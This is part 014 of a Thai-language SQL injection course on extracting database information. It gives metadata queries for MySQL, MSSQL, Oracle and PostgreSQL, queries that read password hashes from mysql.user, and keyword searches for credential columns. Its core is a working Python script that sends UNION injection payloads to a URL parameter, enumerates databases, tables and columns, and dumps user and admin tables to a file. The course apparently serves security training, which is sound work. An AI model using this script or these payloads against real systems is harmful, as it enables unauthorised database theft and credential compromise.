# Part 014: การดึงข้อมูล Database (Extracting Database Information)

## ภาพรวม

หลังจากพบช่องโหว่ SQL Injection ขั้นตอนต่อไปคือการ enumerate และดึงข้อมูลจาก database อย่างเป็นระบบ ส่วนนี้ครอบคลุมการดึงข้อมูล metadata และ system information จาก database ประเภทต่างๆ

**ขั้นตอนที่ 141-155**

---

## 141. Information Schema (MySQL/MSSQL/PostgreSQL)

### 41.1 information_schema คืออะไร?

`information_schema` เป็น virtual database ที่มีข้อมูล metadata เกี่ยวกับ database ทั้งหมด ประกอบด้วย:

```
information_schema
├── SCHEMATA          - ข้อมูล databases ทั้งหมด
├── TABLES            - ข้อมูล tables ทั้งหมด
├── COLUMNS           - ข้อมูล columns ทั้งหมด
├── VIEWS             - ข้อมูล views
├── ROUTINES          - ข้อมูล stored procedures/functions
├── TRIGGERS          - ข้อมูล triggers
├── USER_PRIVILEGES   - ข้อมูล user privileges
└── ...
```

### 41.2 MySQL information_schema Queries

```sql
-- ดู databases ทั้งหมด
SELECT schema_name FROM information_schema.schemata;

-- ดู tables ใน database ปัจจุบัน
SELECT table_name FROM information_schema.tables 
WHERE table_schema = database();

-- ดู columns ใน table
SELECT column_name, data_type, column_type 
FROM information_schema.columns 
WHERE table_name = 'users';
```

### 41.3 MSSQL System Tables

```sql
-- ดู databases ทั้งหมด
SELECT name FROM sys.databases;

-- ดู tables ใน database ปัจจุบัน
SELECT name FROM sys.tables;
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;

-- ดู columns
SELECT COLUMN_NAME, DATA_TYPE 
FROM INFORMATION_SCHEMA.COLUMNS 
WHERE TABLE_NAME = 'users';
```

### 41.4 Oracle Data Dictionary

```sql
-- Oracle ใช้ Data Dictionary Views
-- ALL_* = accessible objects
-- USER_* = owned by current user
-- DBA_* = all objects (requires DBA privileges)

-- ดู tables
SELECT table_name FROM all_tables;
SELECT table_name FROM user_tables;

-- ดู columns
SELECT column_name, data_type 
FROM all_tab_columns 
WHERE table_name = 'USERS';

-- ดู version
SELECT banner FROM v$version;
```

### 41.5 PostgreSQL System Catalogs

```sql
-- ดู databases
SELECT datname FROM pg_database;

-- ดู tables
SELECT tablename FROM pg_tables WHERE schemaname = 'public';

-- ดู users
SELECT usename FROM pg_user;

-- ดู version
SELECT version();
```

---

## 142. System Variables และ Functions

### 42.1 MySQL System Information

```sql
SELECT version();
SELECT @@hostname;
SELECT @@datadir;
SELECT @@secure_file_priv;
SELECT database();
SELECT user();
SELECT @@version_compile_os;
SELECT @@version_compile_machine;
```

### 42.2 MSSQL System Information

```sql
SELECT @@version;
SELECT @@servername;
SELECT db_name();
SELECT system_user;
SELECT host_name();
SELECT serverproperty('ProductVersion');
SELECT serverproperty('Edition');
```

### 42.3 Oracle System Information

```sql
SELECT banner FROM v$version;
SELECT name FROM v$database;
SELECT user FROM dual;
SELECT host_name FROM v$instance;
SELECT sys_context('USERENV','IP_ADDRESS') FROM dual;
SELECT sys_context('USERENV','OS_USER') FROM dual;
```

### 42.4 PostgreSQL System Information

```sql
SELECT version();
SELECT current_database();
SELECT current_user;
SELECT inet_server_addr();
SELECT inet_server_port();
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

---

## 143. การดึงข้อมูล Credentials

### 43.1 MySQL User Credentials

```sql
-- MySQL >= 5.7
SELECT user, authentication_string FROM mysql.user;

-- MySQL <= 5.6
SELECT user, password FROM mysql.user;

SHOW GRANTS FOR 'webapp'@'localhost';
```

### 43.2 หา Tables ที่น่าสนใจ

```sql
-- หา tables ที่น่าจะมี credentials
SELECT table_name FROM information_schema.tables 
WHERE table_name LIKE '%user%' 
   OR table_name LIKE '%admin%'
   OR table_name LIKE '%account%'
   OR table_name LIKE '%credential%';

-- หา columns ที่น่าจะมี passwords
SELECT table_name, column_name 
FROM information_schema.columns 
WHERE column_name LIKE '%pass%'
   OR column_name LIKE '%pwd%'
   OR column_name LIKE '%hash%'
   OR column_name LIKE '%secret%'
   OR column_name LIKE '%token%';
```

---

## 144. การดึงข้อมูลด้วย Python อย่างเป็นระบบ

```python
#!/usr/bin/env python3
"""
Database Information Extractor
Systematic approach to extracting database metadata
"""

import requests
import re
import json
from dataclasses import dataclass, field
from typing import List, Optional, Dict

@dataclass
class DatabaseInfo:
    version: str = ""
    current_db: str = ""
    current_user: str = ""
    hostname: str = ""
    databases: List[str] = field(default_factory=list)
    tables: Dict[str, List[str]] = field(default_factory=dict)
    columns: Dict[str, List[str]] = field(default_factory=dict)

class DBExtractor:
    def __init__(self, url, param, injection_type="union", visible_col=2, num_cols=3):
        self.url = url
        self.param = param
        self.visible_col = visible_col
        self.num_cols = num_cols
        self.session = requests.Session()
        self.info = DatabaseInfo()
    
    def union_payload(self, data_query):
        cols = ['NULL'] * self.num_cols
        cols[self.visible_col - 1] = f"({data_query})"
        return f"999999 UNION SELECT {','.join(cols)}-- -"
    
    def request_and_extract(self, query, pattern=None):
        payload = self.union_payload(query)
        params = {self.param: payload}
        r = self.session.get(self.url, params=params, timeout=10)
        
        if pattern:
            match = re.search(pattern, r.text)
            if match:
                return match.group(1)
        return r.text
    
    def get_system_info(self):
        print("[*] Gathering system information...")
        queries = {
            'version': 'version()',
            'database': 'database()',
            'user': 'user()',
            'hostname': '@@hostname',
            'datadir': '@@datadir',
            'os': '@@version_compile_os',
        }
        for key, query in queries.items():
            try:
                result = self.request_and_extract(query)
                print(f"    {key}: {result[:100] if result else 'N/A'}")
            except:
                pass
    
    def enumerate_databases(self):
        print("\n[*] Enumerating databases...")
        query = "SELECT GROUP_CONCAT(schema_name ORDER BY schema_name SEPARATOR '|') FROM information_schema.schemata"
        result = self.request_and_extract(query)
        if result:
            match = re.search(r'([a-zA-Z0-9_]+(?:\|[a-zA-Z0-9_]+)*)', result)
            if match:
                dbs = match.group(1).split('|')
                self.info.databases = dbs
                print(f"[+] Found databases: {dbs}")
                return dbs
        return []
    
    def enumerate_tables(self, database=None):
        if database:
            db_filter = f"table_schema='{database}'"
        else:
            db_filter = "table_schema=database()"
        
        print(f"\n[*] Enumerating tables in {database or 'current database'}...")
        query = f"SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR '|') FROM information_schema.tables WHERE {db_filter}"
        result = self.request_and_extract(query)
        if result:
            match = re.search(r'([a-zA-Z0-9_]+(?:\|[a-zA-Z0-9_]+)*)', result)
            if match:
                tables = match.group(1).split('|')
                self.info.tables[database or 'current'] = tables
                print(f"[+] Found tables: {tables}")
                return tables
        return []
    
    def enumerate_columns(self, table, database=None):
        filters = [f"table_name='{table}'"]
        if database:
            filters.append(f"table_schema='{database}'")
        
        where_clause = ' AND '.join(filters)
        print(f"\n[*] Enumerating columns in {table}...")
        query = f"SELECT GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR '|') FROM information_schema.columns WHERE {where_clause}"
        result = self.request_and_extract(query)
        if result:
            match = re.search(r'([a-zA-Z0-9_]+(?:\|[a-zA-Z0-9_]+)*)', result)
            if match:
                columns = match.group(1).split('|')
                self.info.columns[table] = columns
                print(f"[+] Found columns: {columns}")
                return columns
        return []
    
    def dump_table(self, table, columns, limit=50):
        col_concat = ',0x7c,'.join([f"IFNULL({col},0x4e554c4c)" for col in columns])
        print(f"\n[*] Dumping {table}...")
        query = f"SELECT GROUP_CONCAT({col_concat} ORDER BY 1 SEPARATOR 0x0a) FROM {table} LIMIT {limit}"
        return self.request_and_extract(query)
    
    def full_enumerate(self, target_tables=None):
        print("="*60)
        print("SQL Injection Database Enumeration")
        print("="*60)
        
        self.get_system_info()
        databases = self.enumerate_databases()
        
        for db in databases[:3]:
            tables = self.enumerate_tables(db)
            sensitive_keywords = ['user', 'admin', 'account', 'member', 'login', 'credential']
            for table in tables:
                if any(kw in table.lower() for kw in sensitive_keywords):
                    columns = self.enumerate_columns(table, db)
                    if columns:
                        self.dump_table(table, columns[:5])
        
        with open('db_dump.json', 'w') as f:
            json.dump({
                'url': self.url,
                'databases': databases,
                'tables': self.info.tables,
                'columns': self.info.columns,
            }, f, indent=2)
        print("\n[+] Results saved to db_dump.json")


if __name__ == "__main__":
    extractor = DBExtractor(
        url="http://example.com/items",
        param="id",
        visible_col=2,
        num_cols=3
    )
    extractor.full_enumerate()
```

---

## 145. แบบฝึกหัด

### Exercise 1: System Enumeration

1. ดึง version, database, user
2. ดึงรายชื่อ databases ทั้งหมด
3. ดึงรายชื่อ tables
4. ดึงรายชื่อ columns

### Exercise 2: Cross-Database Enumeration

สำหรับแต่ละ database engine:
1. ระบุ query ดึง version
2. ระบุ query ดึงรายชื่อ tables
3. ระบุ query ดึงรายชื่อ columns

---

## สรุป

1. **System information** - version, user, hostname, datadir
2. **information_schema** - databases, tables, columns
3. **Sensitive data** - credentials, tokens, secrets
4. **Platform-specific queries** - MySQL, MSSQL, Oracle, PostgreSQL

---

*Part 014 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
